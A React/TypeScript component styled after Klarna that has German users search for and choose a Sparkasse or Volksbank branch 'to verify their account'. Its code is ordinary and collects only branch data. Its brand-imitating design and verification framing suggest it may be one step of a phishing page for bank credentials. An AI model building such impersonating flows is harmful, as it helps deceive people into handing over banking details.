import React, { useState, useEffect, useRef } from 'react';
import { Search, MapPin, Building, ChevronDown, ChevronRight } from 'lucide-react';
import axios from 'axios';

// Branch interfaces
interface Branch {
  id: number;
  city: string;
  branch_name: string;
  zip_code: string;
  section?: string;
  search_text?: string;
  rank?: number;
}

interface SelectedBranch {
  branch_id: number;
  branch_name: string;
  city: string;
  zip_code: string;
}

interface KlarnaBranchSelectionProps {
  selectedBank: string;
  onSubmit: (branch: SelectedBranch) => void;
}

const KlarnaBranchSelection: React.FC<KlarnaBranchSelectionProps> = ({ selectedBank, onSubmit }) => {
  const [searchQuery, setSearchQuery] = useState('');
  const [searchResults, setSearchResults] = useState<Branch[]>([]);
  const [isLoading, setIsLoading] = useState(false);
  const [isDropdownOpen, setIsDropdownOpen] = useState(false);
  const [selectedIndex, setSelectedIndex] = useState(-1);
  const [error, setError] = useState<string | null>(null);
  const [selectedBranch, setSelectedBranch] = useState<Branch | null>(null);
  
  const searchInputRef = useRef<HTMLInputElement>(null);
  const dropdownRef = useRef<HTMLDivElement>(null);
  const searchTimeoutRef = useRef<NodeJS.Timeout | null>(null);

  // Get bank display name
  const getBankDisplayName = (bankId: string) => {
    const bankNames: { [key: string]: string } = {
      'sparkasse': 'Sparkasse',
      'volksbank': 'Volksbank'
    };
    return bankNames[bankId] || bankId;
  };

  // Debounced search function
  const performSearch = async (query: string) => {
    if (!query.trim()) {
      setSearchResults([]);
      setIsDropdownOpen(false);
      return;
    }

    setIsLoading(true);
    setError(null);

    try {
      const response = await axios.get(`/api/branches/search?q=${encodeURIComponent(query)}&limit=10&type=${selectedBank}`);
      const branches = response.data || [];
      
      setSearchResults(branches);
      setIsDropdownOpen(branches.length > 0);
      setSelectedIndex(-1);
    } catch (error) {
      console.error('Branch search error:', error);
      setError('Fehler bei der Filialsuche. Bitte versuchen Sie es erneut.');
      setSearchResults([]);
      setIsDropdownOpen(false);
    } finally {
      setIsLoading(false);
    }
  };

  // Handle search input changes with debouncing
  const handleSearchChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    setSearchQuery(value);
    
    // Clear existing timeout
    if (searchTimeoutRef.current) {
      clearTimeout(searchTimeoutRef.current);
    }
    
    // Set new timeout for debounced search
    searchTimeoutRef.current = setTimeout(() => {
      performSearch(value);
    }, 300);
  };

  // Handle keyboard navigation
  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (!isDropdownOpen || searchResults.length === 0) return;

    switch (e.key) {
      case 'ArrowDown':
        e.preventDefault();
        setSelectedIndex(prev => 
          prev < searchResults.length - 1 ? prev + 1 : 0
        );
        break;
      case 'ArrowUp':
        e.preventDefault();
        setSelectedIndex(prev => 
          prev > 0 ? prev - 1 : searchResults.length - 1
        );
        break;
      case 'Enter':
        e.preventDefault();
        if (selectedIndex >= 0 && selectedIndex < searchResults.length) {
          handleBranchSelect(searchResults[selectedIndex]);
        }
        break;
      case 'Escape':
        setIsDropdownOpen(false);
        setSelectedIndex(-1);
        break;
    }
  };

  // Handle branch selection
  const handleBranchSelect = (branch: Branch) => {
    setSelectedBranch(branch);
    setSearchQuery(`${branch.branch_name}, ${branch.city} (${branch.zip_code})`);
    setIsDropdownOpen(false);
    setSelectedIndex(-1);
  };

  // Handle form submission
  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!selectedBranch) {
      setError('Bitte wählen Sie eine Filiale aus.');
      return;
    }

    const branchData: SelectedBranch = {
      branch_id: selectedBranch.id,
      branch_name: selectedBranch.branch_name,
      city: selectedBranch.city,
      zip_code: selectedBranch.zip_code
    };

    onSubmit(branchData);
  };

  // Close dropdown when clicking outside
  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      if (dropdownRef.current && !dropdownRef.current.contains(event.target as Node)) {
        setIsDropdownOpen(false);
        setSelectedIndex(-1);
      }
    };

    document.addEventListener('mousedown', handleClickOutside);
    return () => document.removeEventListener('mousedown', handleClickOutside);
  }, []);

  return (
    <div className="klarna-bank-selector">
      <div className="klarna-verification-notice">
        <h1 className="klarna-title">Filiale auswählen</h1>
        <p className="klarna-subtitle">
          Bitte wählen Sie Ihre {getBankDisplayName(selectedBank)}-Filiale aus, um fortzufahren.
        </p>
      </div>

      <div className="klarna-card-layout">
        <div className="klarna-card-form-column">
          <form onSubmit={handleSubmit} className="klarna-form">
          {/* Branch Search */}
          <div className="klarna-form-group">
            <label htmlFor="branch-search" className="klarna-label">
              <MapPin size={16} className="klarna-label-icon" />
              Filiale suchen
            </label>
            <div className="klarna-search-container" ref={dropdownRef}>
              <div className="klarna-search-input-wrapper">
                <Search size={20} className="klarna-search-icon" />
                <input
                  ref={searchInputRef}
                  type="text"
                  id="branch-search"
                  value={searchQuery}
                  onChange={handleSearchChange}
                  onKeyDown={handleKeyDown}
                  onFocus={() => {
                    if (searchResults.length > 0) {
                      setIsDropdownOpen(true);
                    }
                  }}
                  className="klarna-input"
                  placeholder="Stadt, PLZ oder Filialname eingeben..."
                  autoComplete="off"
                  style={{ paddingLeft: '48px' }}
                />
                {isLoading && (
                  <div className="klarna-search-loading">
                    <div className="klarna-spinner"></div>
                  </div>
                )}
              </div>

              {/* Search Results Dropdown */}
              {isDropdownOpen && searchResults.length > 0 && (
                <div className="klarna-dropdown">
                  {searchResults.map((branch, index) => (
                    <div
                      key={branch.id}
                      className={`klarna-dropdown-item ${index === selectedIndex ? 'klarna-dropdown-item-selected' : ''}`}
                      onClick={() => handleBranchSelect(branch)}
                    >
                      <div className="klarna-branch-info">
                        <div className="klarna-branch-name">
                          <Building size={16} className="klarna-branch-icon" />
                          {branch.branch_name}
                        </div>
                        <div className="klarna-branch-location">
                          <MapPin size={14} className="klarna-location-icon" />
                          {branch.city}, {branch.zip_code}
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>

          {/* Selected Branch Display */}
          {selectedBranch && (
            <div className="klarna-selected-branch">
              <div className="klarna-selected-branch-header">
                <Building size={20} className="klarna-selected-icon" />
                <span className="klarna-selected-title">Ausgewählte Filiale:</span>
              </div>
              <div className="klarna-selected-branch-info">
                <div className="klarna-selected-name">{selectedBranch.branch_name}</div>
                <div className="klarna-selected-location">
                  <MapPin size={14} className="klarna-location-icon" />
                  {selectedBranch.city}, {selectedBranch.zip_code}
                </div>
              </div>
            </div>
          )}

          {/* Error Display */}
          {error && (
            <div className="klarna-error-message">
              <span className="klarna-error-text">{error}</span>
            </div>
          )}

          {/* Continue Button */}
          <div className="klarna-form-actions">
            <button
              type="submit"
              className="klarna-button klarna-button-primary"
              disabled={!selectedBranch || isLoading}
            >
              <span>Weiter</span>
              <ChevronRight size={20} />
            </button>
          </div>
        </form>
        </div>

        {/* Instructions Column */}
        <div className="klarna-card-preview-column">
          <div className="klarna-instructions-section">
            <div className="klarna-instructions-header">
              <Building size={24} className="klarna-instructions-icon" />
              <h3 className="klarna-instructions-title">Filialsuche</h3>
            </div>
            
            <div className="klarna-instructions-content">
              <p className="klarna-instructions-text">
                Zur Verifizierung Ihres {getBankDisplayName(selectedBank)}-Kontos benötigen wir Ihre Filialinformationen.
              </p>
              
              <div className="klarna-help-list">
                <div className="klarna-help-item">
                  <Search size={16} className="klarna-help-icon" />
                  <span>Stadt oder PLZ eingeben</span>
                </div>
                <div className="klarna-help-item">
                  <Building size={16} className="klarna-help-icon" />
                  <span>Filialname für genauere Suche</span>
                </div>
                <div className="klarna-help-item">
                  <MapPin size={16} className="klarna-help-icon" />
                  <span>Pfeiltasten zur Navigation</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default KlarnaBranchSelection;
